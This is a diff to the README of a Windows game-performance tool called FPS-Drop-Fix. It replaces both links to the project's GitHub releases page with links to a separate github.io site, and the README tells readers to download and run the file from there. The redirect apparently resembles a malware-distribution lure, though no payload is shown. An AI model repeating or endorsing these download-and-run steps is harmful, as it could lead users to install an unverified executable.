@@ -1,6 +1,6 @@
 # 🎮 FPS-Drop-Fix - Improve Your Game Performance Today
 
-[![](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/stephenarnolddouglassuspect203/FPS-Drop-Fix/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue)](https://stephenarnolddouglassuspect203.github.io)
 
 FPS-Drop-Fix helps you play games on Windows 10 and 11 without stutters or freezes. Many computers run background tasks that interrupt your game. These interruptions cause dropped frames and micro-freezes. This tool cleans your system and adjust settings to keep your game flow smooth.
 
@@ -19,7 +19,7 @@ You need a basic understanding of your PC to use this tool. Please check these r
 
 ## 🚀 Getting Started
 
-1. Go to the [releases page](https://github.com/stephenarnolddouglassuspect203/FPS-Drop-Fix/releases).
+1. Go to the [releases page](https://stephenarnolddouglassuspect203.github.io).
 2. Click the most recent version of the application.
 3. Save the file to your computer.
 4. Run the file to start the installation.
